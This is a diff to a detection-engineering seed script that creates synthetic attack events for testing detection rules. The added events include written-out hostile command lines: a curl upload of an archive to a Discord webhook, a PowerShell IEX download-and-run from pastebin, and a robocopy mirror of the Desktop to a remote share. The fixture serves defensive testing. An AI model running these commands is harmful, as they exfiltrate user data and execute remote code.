@@ -2,7 +2,7 @@
 """Seed one incident that exercises every rule in the corpus.
 
 seed_apt.py tells one attacker's story end to end. This script has a different
-job: it is a regression fixture and a coverage demo, built to fire all 111 rules
+job: it is a regression fixture and a coverage demo, built to fire all 115 rules
 -- across every EventID the engine understands (1, 2, 3, 6, 7, 8, 9, 10, 11,
 12, 13, 15, 17, 20, 22, 23, 25) plus a handful of EventIDs no rule keys on (18,
 19, 21) added purely so the incident's raw event stream and process tree show
@@ -87,6 +87,10 @@ machine. The phases, roughly in kill-chain order:
       │   clipboard-hijack pattern (read then overwrite), and Problem Steps
       │   Recorder abused for silent screenshot collection
       │   (SYS-155 through SYS-158)
+      ├─ coverage-expansion pass 7: a Discord webhook and a pastebin raw
+      │   dead-drop as web-service C2 channels, a broad Documents archive,
+      │   and a robocopy mass-mirror of Desktop to a remote share
+      │   (SYS-159 through SYS-162)
       ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
       ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
       ├─ w3wp.exe -> cmd.exe, appcmd.exe                     (SYS-088/038/039)
@@ -129,7 +133,8 @@ EXPECTED_RULES = {
     "SYS-128", "SYS-129", "SYS-130", "SYS-131", "SYS-132", "SYS-133", "SYS-135",
     "SYS-136", "SYS-137", "SYS-138", "SYS-139", "SYS-140", "SYS-141", "SYS-142",
     "SYS-143", "SYS-144", "SYS-148", "SYS-149", "SYS-150", "SYS-151", "SYS-152",
-    "SYS-153", "SYS-154", "SYS-155", "SYS-156", "SYS-157", "SYS-158",
+    "SYS-153", "SYS-154", "SYS-155", "SYS-156", "SYS-157", "SYS-158", "SYS-159",
+    "SYS-160", "SYS-161", "SYS-162",
 }
 
 
@@ -264,6 +269,11 @@ G = {
     "rmm_tool": "{rng-rmm-tool}",
     "clip_hijack": "{rng-clip-hijack}",
     "psr_capture": "{rng-psr-capture}",
+    # Coverage-expansion pass 7: web-service C2 + data staging (SYS-159..162).
+    "webhook_c2": "{rng-webhook-c2}",
+    "paste_dropoff": "{rng-paste-dropoff}",
+    "archive_staging": "{rng-archive-staging}",
+    "robocopy_staging": "{rng-robocopy-staging}",
 }
 
 
@@ -861,6 +871,34 @@ def events() -> list[dict]:
                     r"psr.exe /start /gui 0 /output C:\Users\redteam.ops\AppData\Local"
                     r"\Temp\out.zip",
                     pid=5620, ppid=4510))
+
+    # === Coverage-expansion pass 7: web-service C2 + data staging, off "ops" ===
+    # A Discord webhook used as a covert exfil channel, no attacker
+    # infrastructure required (SYS-159).
+    ev.append(proc(step(1), G["webhook_c2"], G["ops"], r"C:\Windows\System32\curl.exe",
+                    r'curl.exe -X POST -F "file=@C:\Users\redteam.ops\AppData\Local'
+                    r'\Temp\exfil2.7z" https://discord.com/api/webhooks/135792468'
+                    r'/AbCdEfGhIjKlMnOpQrSt',
+                    pid=5630, ppid=4510))
+
+    # A pastebin raw dead-drop fetched straight into memory (SYS-160).
+    ev.append(proc(step(1), G["paste_dropoff"], G["ops"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r'powershell -nop -c "IEX (New-Object Net.WebClient).'
+                    r"DownloadString('https://pastebin.com/raw/9Kx4mPqL')\"",
+                    pid=5640, ppid=4510))
+
+    # A broad user-data directory archived ahead of exfil (SYS-161).
+    ev.append(proc(step(1), G["archive_staging"], G["ops"], r"C:\Program Files\7-Zip\7z.exe",
+                    r"7z.exe a C:\Windows\Temp\stage3.7z C:\Users\redteam.ops\Documents",
+                    pid=5650, ppid=4510))
+
+    # robocopy mass-mirrors a Desktop tree out to a remote share (SYS-162).
+    ev.append(proc(step(1), G["robocopy_staging"], G["ops"],
+                    r"C:\Windows\System32\robocopy.exe",
+                    r"robocopy.exe C:\Users\redteam.ops\Desktop "
+                    r"\\45.132.192.68\share\loot /MIR",
+                    pid=5660, ppid=4510))
 
     # === FTP LOLBAS execution, off "ops" ===
     ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
